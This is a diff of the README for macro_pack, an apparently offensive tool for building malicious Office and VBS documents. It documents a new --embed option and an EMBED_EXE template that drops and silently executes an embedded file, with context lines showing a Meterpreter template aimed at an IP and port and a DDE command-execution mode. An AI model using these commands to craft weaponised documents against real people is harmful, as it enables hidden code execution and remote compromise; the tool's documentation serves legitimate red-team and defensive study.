@@ -279,6 +279,9 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
         Supported extensions are: vba, vbs, hta, doc, docm, xls, xlsm, pptm, vsd, vsdm.
         Note: Apart from vba which is a text files, all other requires Windows OS with right MS Office application installed.
     
+    -e, --embed=EMBEDDED_FILE_PATH Will embed the given file in the body of the generated document.
+         Use with EMBED_EXE template to auto drop and exec the file.
+    
     --dde  Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
          DDE attack mode is not compatible with VBA Macro related options.
          Usage: echo calc.exe | macro_pack.exe --dde -W DDE.docx
@@ -413,13 +416,14 @@ exploit -j
 ```
 
 
-### EMBED_EXE
-Will encode an executable inside the vba. When macro is played, exe will be decoded and executed (hidden) on file system.
-This template is inspired by https://github.com/khr0x40sh/MacroShop
-Give this template the path to exe you want to embed in vba and, optionaly, the path where exe should be extracted
-If extraction path is not given, exe will be extracted with random name in current path.  
-  -> Example1: ```echo "path\\to\my_exe.exe" | macro_pack.exe  -t EMBED_EXE -o -G my_exe.xlsm```  
-  -> Example2: ```echo "path\\to\my_exe.exe" "D:\\another\path\your_exe.exe" | macro_pack.exe  -t EMBED_EXE -o -G my_exe.xlsm```  
+### EMBED_EXE    
+        
+Combine with --embed option, it will drop and execute (hidden) the embedded file.  
+Optionaly you can give to the template the path where file should be extracted  
+If extraction path is not given, file will be extracted with random name in current path.   
+ -> Example1: ``` macro_pack.ex  -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.vbs```  
+ -> Example2: ```echo "path\\to\newcalc.exe" | macro_pack.ex -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.vbs```  
+
 
 
 ## Efficiency
